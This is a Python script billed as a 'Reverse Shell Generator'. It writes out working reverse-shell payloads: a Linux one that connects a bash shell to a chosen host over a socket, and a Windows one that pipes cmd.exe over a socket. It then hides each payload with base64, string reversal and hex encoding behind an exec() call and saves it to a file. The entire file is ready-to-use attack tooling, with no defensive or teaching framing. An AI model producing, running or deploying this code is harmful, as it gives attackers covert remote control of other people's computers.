import base64
import binascii
import sys

def generate_linux_reverse_shell(host, port):
    """Generate a Linux reverse shell"""
    code = f"""
import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('{host}',{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn('/bin/bash')
"""
    return code

def generate_windows_reverse_shell(host, port):
    """Generate a Windows reverse shell"""
    code = f"""
import socket,subprocess,threading,time

def receive_output(sock, proc):
    try:
        while True:
            data = proc.stdout.read(1)
            if data:
                sock.send(data)
    except:
        pass

def send_input(sock, proc):
    try:
        while True:
            data = sock.recv(1024)
            if not data:
                break
            proc.stdin.write(data)
            proc.stdin.flush()
    except:
        pass

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('{host}', {port}))
    
    # Start cmd.exe with proper I/O redirection
    proc = subprocess.Popen(
        'cmd.exe',
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        shell=True,
        bufsize=0
    )
    
    # Create threads for input/output
    output_thread = threading.Thread(target=receive_output, args=(s, proc))
    input_thread = threading.Thread(target=send_input, args=(s, proc))
    
    output_thread.daemon = True
    input_thread.daemon = True
    
    output_thread.start()
    input_thread.start()
    
    # Keep the main thread alive
    while output_thread.is_alive() and input_thread.is_alive():
        time.sleep(0.1)
        
except Exception as e:
    sys.exit(0)
"""
    return code

def obfuscate_code(code):
    """Obfuscate the code using multiple techniques"""
    # 1. Base64 encoding
    b64_code = base64.b64encode(code.encode()).decode()
    
    # 2. String reversal
    reversed_b64 = b64_code[::-1]
    
    # 3. Hex encoding
    hex_encoded = reversed_b64.encode().hex()
    
    # Create the final obfuscated payload
    obfuscated = f"""
import base64,binascii
exec(base64.b64decode(binascii.unhexlify('{hex_encoded}')[::-1]).decode())
"""
    return obfuscated

def main():
    # Get user input
    print("Reverse Shell Generator")
    print("=" * 25)
    
    host = input("Enter the target IP: ")
    port = input("Enter the target port: ")
    
    # Validate port is a number
    try:
        port = int(port)
    except ValueError:
        print("Port must be a number!")
        return
    
    # Select OS
    print("\nSelect target OS:")
    print("1. Linux")
    print("2. Windows")
    choice = input("Enter choice (1 or 2): ")
    
    if choice == "1":
        os_type = "Linux"
        code = generate_linux_reverse_shell(host, port)
    elif choice == "2":
        os_type = "Windows"
        code = generate_windows_reverse_shell(host, port)
    else:
        print("Invalid choice!")
        return
    
    # Obfuscate the code
    obfuscated_code = obfuscate_code(code)
    
    # Generate filename
    filename = f"reverse_shell_{os_type.lower()}.py"
    
    # Save to a file
    with open(filename, "w") as f:
        f.write(obfuscated_code)
    
    print(f"\nObfuscated {os_type} reverse shell saved to '{filename}'")
    
    # Display the code
    print("\n" + "=" * 60)
    print(f"Obfuscated {os_type} Reverse Shell Code:")
    print("=" * 60)
    print(obfuscated_code)

if __name__ == "__main__":
    main()